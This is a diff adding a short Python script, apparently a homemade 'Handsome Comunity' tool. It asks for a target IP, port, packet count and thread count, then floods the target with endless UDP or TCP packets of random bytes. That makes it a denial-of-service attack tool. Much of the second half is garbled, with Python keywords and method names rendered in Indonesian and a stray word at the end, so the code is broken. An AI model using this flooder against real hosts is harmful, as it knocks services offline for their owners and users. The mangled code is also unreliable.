@@ -1,0 +1,99 @@
+#Autor By Cyber
+
+import random
+
+import socket
+
+import threading
+
+import os
+
+
+
+os.system("clear")
+
+print("#-- Handsome Comunity --#")
+
+print("--> Handsome Comunity <--")
+
+print("#-- TOOLS BY Handsome --#")
+
+ip = str(input(" Masukan IP:"))
+
+port = int(input(" Port:"))
+
+choice = str(input(" Ketik y untuk melanjutkan ketik n untuk berhenti (y/n):"))
+
+times = int(input(" Packet:"))
+
+threads = int(input(" Theards?:"))
+
+def run():
+
+	data = random._urandom(20000)
+
+	i = random.choice(("[*]","[!]","[#]"))
+
+	while True:
+
+		try:
+
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+			addr = (str(ip),int(port))
+
+			for x in range(times):
+
+				s.sendto(data,addr)
+
+			print(i +" OHandsome!!!")
+
+		except:
+
+			print("[!] Handsome!!!")
+
+
+
+def run2():
+
+	data = random._urandom(696969)
+
+	i = random.choice(("[*]","[!]","[#]"))
+
+	sementara Benar:
+
+		mencoba:
+
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+			s.koneksi((ip,port))
+
+			s.kirim(data)
+
+			untuk x dalam rentang (kali):
+
+				s.kirim(data)
+
+			print(i +" Tampan!!!")
+
+		kecuali:
+
+			s.close()
+
+			print("[*] Server Mati")
+
+
+
+untuk y dalam jangkauan (utas):
+
+	jika pilihan == 'y':
+
+		th = threading.Thread(target = run)
+
+		th.mulai()
+
+	kalau tidak:
+
+		th = threading.Thread(target = run2)
+
+		th.start()saya
